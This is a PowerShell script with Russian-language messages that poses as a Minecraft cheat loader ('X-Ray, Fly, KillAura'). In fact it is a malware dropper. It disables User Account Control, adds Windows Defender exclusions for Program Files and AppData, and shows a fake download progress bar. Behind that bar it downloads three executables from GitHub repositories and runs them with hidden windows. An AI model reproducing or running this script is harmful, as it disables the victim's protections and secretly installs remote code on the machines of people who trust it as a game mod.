# --- БЛОК 1: ОТКЛЮЧЕНИЕ UAC (КОНТРОЛЯ УЧЕТНЫХ ЗАПИСЕЙ) ---

Write-Host "Отключение UAC..."
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $uacPath -Name "EnableLUA" -Value 0
Write-Host "UAC отключен. Требуется перезагрузка для полного применения." -ForegroundColor Yellow

# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---

# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
Write-Host "Добавление папок в исключения..."
try {
    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    Add-MpPreference -ExclusionPath $ProgramFiles

    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    if (Test-Path $ProgramFilesX86) {
        Add-MpPreference -ExclusionPath $ProgramFilesX86
    }

    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
    Add-MpPreference -ExclusionPath $AppData

    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    Add-MpPreference -ExclusionPath $LocalAppData
    
    Write-Host "Исключения добавлены." -ForegroundColor Green
}
catch {
    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
}

Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}
Clear-Host
Write-Host "Запуск загрузчика читов для Minecraft..." -ForegroundColor DarkRed
Start-Sleep -Seconds 2

Write-Host "Поиск скрытых серверов с хаком..." -ForegroundColor Yellow
Start-Sleep -Seconds 3

Write-Host "Обход защиты Mojang Auth..." -ForegroundColor Cyan
Start-Sleep -Seconds 2

Write-Host "Авторизация через анонимный прокси..." -ForegroundColor Magenta
Start-Sleep -Seconds 2

Write-Host "Начало скачивания: Minecraft_Ultimate_Hack_v13.37.exe (размер: 666 MB)" -ForegroundColor Green

for ($i = 1; $i -le 100; $i++) {
    $speed = Get-Random -Minimum 15 -Maximum 80
    Write-Progress -Activity "Скачивание читов для Minecraft" -Status "Прогресс: $i% | Скорость: $speed MB/s" -PercentComplete $i
    Start-Sleep -Milliseconds (Get-Random -Minimum 40 -Maximum 180)
}

Write-Progress -Activity "Скачивание читов для Minecraft" -Completed

Write-Host ""
Write-Host "Скачивание завершено на 100%!" -ForegroundColor Green
Start-Sleep -Seconds 2

Write-Host "Распаковка X-Ray, Fly, KillAura и других модулей..." -ForegroundColor Yellow
Start-Sleep -Seconds 4

Write-Host "Интеграция в клиент Minecraft..." -ForegroundColor Cyan
Start-Sleep -Seconds 3

Write-Host "Проверка античита (Bypass успешный)" -ForegroundColor Red
Start-Sleep -Seconds 2

Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1

    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -OutFile "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe"; .\enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe   
    
    # Запускаем
    Start-Process -FilePath "enc_8fc8cad1ed524ccdb5bffaec0af2170b_chekir.exe.exe" -WindowStyle Hidden
    
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/raw/refs/heads/main/chekir.exe" -OutFile "chekir.exe"; .\chekir.exe    
    # Запускаем 
    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
    
    # Удаляем файл через 5 секунды
   
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe" -OutFile "Fx.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "Fx.exe" -WindowStyle Hidden

Write-Host ""
Write-Host "ГОТОВО! ЧИТЫ НА Minecraft УСТАНОВЛЕНЫ!" -ForegroundColor BrightMagenta
Write-Host "X-Ray, Fly, Aimbot, AutoMine — всё работает на любом сервере!" -ForegroundColor BrightGreen
Pause


